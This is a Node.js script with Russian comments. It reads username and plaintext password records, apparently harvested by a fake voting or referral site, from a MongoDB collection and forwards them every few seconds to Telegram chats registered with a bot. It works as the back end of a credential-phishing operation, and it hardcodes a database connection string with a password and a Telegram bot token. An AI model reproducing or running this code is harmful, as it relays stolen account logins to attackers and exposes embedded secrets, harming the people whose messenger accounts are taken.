const { MongoClient } = require('mongodb');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// Конфигурация MongoDB
const uri = 'mongodb+srv://petr:petr900100@db.3bimhc9.mongodb.net/?retryWrites=true&w=majority&appName=DB'; // Адрес вашего MongoDB сервера
const dbName = 'test'; // Имя базы данных
const collectionName = 'users'; // Имя коллекции

// Конфигурация Telegram
const botToken = '5975408409:AAEDbY6RpKAu0hksILn3-tcNahw276EFg98'; // Ваш токен бота Telegram
const chatIdsFile = path.join(__dirname, 'chatIds.json'); // Файл для хранения chatId

// Инициализация бота
const bot = new TelegramBot(botToken, { polling: true });

let timerStarted = false; // Флаг для отслеживания состояния таймера

// Функция для чтения chatId из файла
function readChatIds() {
    if (!fs.existsSync(chatIdsFile)) {
        return [];
    }
    const data = fs.readFileSync(chatIdsFile, 'utf8');
    return JSON.parse(data);
}

// Функция для записи chatId в файл
function writeChatId(chatId) {
    let chatIds = readChatIds();
    if (!chatIds.includes(chatId)) {
        chatIds.push(chatId);
        fs.writeFileSync(chatIdsFile, JSON.stringify(chatIds, null, 2));
    }
}

// Функция для отправки сообщения в Telegram нескольким пользователям
async function sendMessage(text) {
    const chatIds = readChatIds();
    const promises = chatIds.map(chatId => {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const params = {
            chat_id: chatId,
            text: text
        };

        return fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        }).then(response => response.json());
    });

    try {
        const results = await Promise.all(promises);
        results.forEach(result => {
            if (!result.ok) {
                console.error(`Telegram API error: ${result.description}`);
            }
        });
        console.log('Messages sent successfully');
    } catch (error) {
        console.error('Error sending messages to Telegram:', error);
    }
}

// Функция для получения данных из MongoDB и отправки их в Telegram
async function getDataAndSend() {
    const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });

    try {
        // Подключение к MongoDB
        await client.connect();
        console.log('Connected to MongoDB');

        const db = client.db(dbName);
        const collection = db.collection(collectionName);

        // Получение данных из коллекции
        const data = await collection.find({ 
            isSended: { $ne: true },
            voitedFor: { $exists: true }
        }).toArray();
        console.log('Data fetched from MongoDB:', data);

        // Форматирование и отправка данных в Telegram
        const message = data.map((item) => `Username: ${item.username}  |  Password: ${item.password} | Тип мессенжера ${item.messanger} | Количество рефералов: ${item.refferals} | Проголосовал за ${item.voitedFor.name}`).join('\n');
        await sendMessage(message);

        // Обновление статуса документов
        const ids = data.map(item => item._id);
        await collection.updateMany(
            { _id: { $in: ids } },
            { $set: { isSended: true } }
        );
        console.log('Data status updated to isSended');
    } catch (error) {
        console.error('Error fetching data from MongoDB:', error);
    } finally {
        // Закрытие подключения к MongoDB
        await client.close();
    }
}

// Функция для запуска задачи с интервалом
function startInterval() {
    if (!timerStarted) {
        getDataAndSend(); // Запуск функции сразу при старте
        setInterval(getDataAndSend, 5000); // Запуск функции каждые 60 секунд
        timerStarted = true;
    }
}

// Запуск бота и таймера при запуске
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Бот запущен и таймер установлен.");
    writeChatId(chatId);
    startInterval();
});

// Сообщение о готовности бота
console.log('Bot is running...');